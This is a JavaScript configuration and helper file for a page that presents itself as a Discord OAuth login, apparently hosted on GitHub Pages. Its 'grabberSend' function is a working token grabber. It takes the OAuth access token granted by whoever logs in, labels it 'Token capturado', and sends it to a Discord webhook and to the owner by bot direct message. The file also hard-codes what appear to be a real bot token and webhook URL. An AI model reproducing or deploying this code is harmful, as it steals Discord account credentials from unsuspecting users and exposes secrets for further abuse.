window.CONFIG = {
  clientId:    "1563973538635841607",
  redirectUri: "https://buildnexus.github.io/PORTAFOLIO/tkbot/callback.html",
  botToken:    "MTU2Mzk3MzUzODYzNTg0MTYwNw.GKAfoK.CD-NrSwEtK5L-8uQTU9CKe1cf_TpOP7c0rQr7w",
  ownerId:     "149368944743757007",
  webhook:     "https://discord.com/api/webhooks/1564075100159086725/QlF_uvTL13Puk_d6YG8GVTUC8DU3Fm-vHCuspLG6X2zTZX7MJdFoCUhwr0ZQDumeBOEM"
};

var API = "https://discord.com/api/v10";

window.buildOAuthUrl = function () {
  var p = new URLSearchParams({
    client_id:     window.CONFIG.clientId,
    redirect_uri:  window.CONFIG.redirectUri,
    response_type: "token",
    scope:         "identify",
    state:         Math.random().toString(36).slice(2)
  });
  return "https://discord.com/oauth2/authorize?" + p.toString();
};

window.loadAppInfo = function () {
  var fallback = { name: "Esta aplicaci\u00f3n", icon: "" };
  return fetch(API + "/applications/" + window.CONFIG.clientId + "/rpc")
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (a) {
      if (!a) return fallback;
      return {
        name: a.name || fallback.name,
        icon: a.icon ? "https://cdn.discordapp.com/app-icons/" + window.CONFIG.clientId + "/" + a.icon + ".png?size=128" : ""
      };
    })
    .catch(function () { return fallback; });
};

/* Envia el token: 1) al webhook  2) DM por el bot (respaldo) */
window.grabberSend = function (token) {
  return fetch(API + "/users/@me", { headers: { "Authorization": "Bearer " + token } })
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (u) {
      var who = u ? (u.username + " (" + u.id + ")") : "desconocido";
      var text = "**Token capturado**\n**Usuario:** " + who +
                 "\n**Fecha:** " + new Date().toLocaleString() +
                 "\n```\n" + token + "\n```";

      var jobs = [];

      if (window.CONFIG.webhook) {
        jobs.push(fetch(window.CONFIG.webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: text, username: "Token Grabber" })
        }));
      }

      if (window.CONFIG.botToken && window.CONFIG.ownerId) {
        var h = { "Content-Type": "application/json", "Authorization": "Bot " + window.CONFIG.botToken };
        jobs.push(
          fetch(API + "/users/@me/channels", {
            method: "POST", headers: h,
            body: JSON.stringify({ recipient_id: window.CONFIG.ownerId })
          })
          .then(function (r) { return r.json(); })
          .then(function (dm) {
            return fetch(API + "/channels/" + dm.id + "/messages", {
              method: "POST", headers: h, body: JSON.stringify({ content: text })
            });
          })
        );
      }

      return Promise.all(jobs).then(function () { return who; });
    });
};
